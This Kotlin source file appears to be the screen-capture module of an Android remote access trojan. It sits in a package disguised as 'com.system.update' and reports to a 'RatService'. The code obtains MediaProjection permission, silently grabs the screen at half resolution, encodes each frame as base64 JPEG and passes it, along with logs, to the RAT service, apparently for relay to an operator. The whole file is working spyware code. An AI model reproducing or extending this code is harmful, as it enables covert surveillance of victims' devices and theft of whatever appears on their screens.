package com.system.update

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.ByteArrayOutputStream

object ScreenCapture {

    private const val TAG = "ScreenCapture"

    @Volatile private var projection: MediaProjection? = null
    @Volatile private var projectionManager: MediaProjectionManager? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var projectionCallback: MediaProjection.Callback? = null

    private fun slog(msg: String) {
        Log.i(TAG, msg)
        RatService.instance?.sendLog(TAG, msg)
    }
    private fun elog(msg: String) {
        Log.e(TAG, msg)
        RatService.instance?.sendLog(TAG, "ERR: $msg")
    }

    fun requestIntent(ctx: Context): Intent {
        slog("requestIntent")
        projectionManager = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as MediaProjectionManager
        return projectionManager!!.createScreenCaptureIntent()
    }

    fun onActivityResult(ctx: Context, code: Int, data: Intent?) {
        if (code != Activity.RESULT_OK || data == null) {
            elog("Denied by user (code=$code)")
            projection = null
            return
        }
        try {
            if (projectionManager == null) {
                projectionManager = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                        as MediaProjectionManager
            }
            val newProjection = projectionManager!!.getMediaProjection(code, data)

            projectionCallback?.let {
                try { projection?.unregisterCallback(it) } catch (_: Exception) {}
            }

            projectionCallback = object : MediaProjection.Callback() {
                override fun onStop() {
                    slog("MediaProjection onStop")
                    projection = null
                }
            }
            newProjection.registerCallback(projectionCallback!!, Handler(Looper.getMainLooper()))
            projection = newProjection
            slog("Ready — MediaProjection granted")
        } catch (e: Exception) {
            elog("onActivityResult exception: ${e.message}")
            projection = null
        }
    }

    fun getProjection(): MediaProjection? = projection

    fun isReady(): Boolean = projection != null

    fun release() {
        try {
            slog("release")
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            projectionCallback?.let {
                try { projection?.unregisterCallback(it) } catch (_: Exception) {}
            }
            projectionCallback = null
            projection?.stop()
            projection = null
        } catch (e: Exception) {
            elog("release error: ${e.message}")
        }
    }

    @SuppressLint("WrongConstant")
    fun capture(ctx: Context, callback: (String?) -> Unit) {
        val proj = projection
        if (proj == null) {
            elog("capture called but projection null")
            callback(null)
            return
        }

        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)

            val scale = 0.5f
            val width = (metrics.widthPixels * scale).toInt()
            val height = (metrics.heightPixels * scale).toInt()
            val dpi = (metrics.densityDpi * scale).toInt()

            slog("capture virtual display ${width}x${height}")

            val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            imageReader = reader

            virtualDisplay = proj.createVirtualDisplay(
                "screen-cap",
                width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface,
                null,
                Handler(Looper.getMainLooper())
            )

            reader.setOnImageAvailableListener({ r ->
                val image = try { r.acquireLatestImage() } catch (_: Exception) { null }
                if (image != null) {
                    try {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width
                        val bmp = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bmp.copyPixelsFromBuffer(buffer)
                        val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                        val bos = ByteArrayOutputStream()
                        cropped.compress(Bitmap.CompressFormat.JPEG, 55, bos)
                        val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                        callback(b64)
                    } catch (e: Exception) {
                        elog("Encode error: ${e.message}")
                        callback(null)
                    } finally {
                        try { image.close() } catch (_: Exception) {}
                        try { virtualDisplay?.release() } catch (_: Exception) {}
                        virtualDisplay = null
                        try { r.close() } catch (_: Exception) {}
                        imageReader = null
                    }
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            elog("capture error: ${e.message}")
            callback(null)
        }
    }
}